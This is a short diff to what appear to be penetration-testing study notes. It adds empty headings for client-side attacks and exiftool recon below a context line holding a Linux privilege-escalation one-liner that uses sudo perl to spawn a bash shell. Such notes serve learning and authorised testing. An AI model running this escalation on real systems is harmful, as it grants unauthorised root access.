@@ -896,3 +896,10 @@ Linux PrivEsc:
 ```bash
 sudo /usr/bin/perl -e 'exec("/bin/bash")'
 ```
+
+
+# Client-side Attacks
+
+## Target Recon
+
+##### exiftool
